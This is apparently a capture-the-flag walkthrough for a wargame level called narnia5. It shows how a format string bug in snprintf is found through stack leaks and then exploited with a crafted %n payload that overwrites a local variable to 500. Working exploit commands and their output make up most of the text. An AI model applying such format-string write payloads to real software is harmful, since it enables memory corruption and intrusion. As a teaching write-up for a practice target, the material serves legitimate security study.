running the binary gives us

    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [] (0)
    i = 1 (0xffffd6f0)

let's use a long input to see if we can change the variable.

    ./narnia5 $(perl -e 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"')

    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPP] (63)
    i = 1 (0xffffd690)

So it looks like only 63 bytes of our input get copied, 64 including the NULL terminator. Disassembling main reveals
this call:

    0x08048528 <+29>:	call   0x80483f0 <snprintf@plt>

    narnia5@narnia:/narnia$ ./narnia5 %08x.%08x.%08x.%08x
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [f7fc5000.30303035.3330332e.33303330] (35)

Looks like we've got a format string bug. First let's see if we can get a formatter to read a value we control.

    ./narnia5 $(perl -e 'print "AAAA%08x%08x%08x%08x"')
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [AAAA41414141313431343134313434333133] (36)

So the very first formatter will use the first 4 bytes of our input as its parameter. If we make it an %n and write i's
addr, we should be able to overwrite the value.

    ./narnia5 $(perl -e 'print "\xe0\xd6\xff\xff" . "%n"')
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [����] (4)
    i = 4 (0xffffd6e0)

Now, the issue is changing the value to what we want. First, let's see where i is with a dummy input of
our payload size, which will be 500 bytes + formatter

    ./narnia5 $(perl -e 'print "DDDD" . "A" x 496 . "%x"')
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [DDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
    i = 1 (0xffffd4f0)

Now all we need to do is replace the %x with an %n and pop in this address:

    ./narnia5 $(perl -e 'print "\xf0\xd4\xff\xff" . "A" x 496 . "%n"')
    Change i's value from 1 -> 500. GOOD
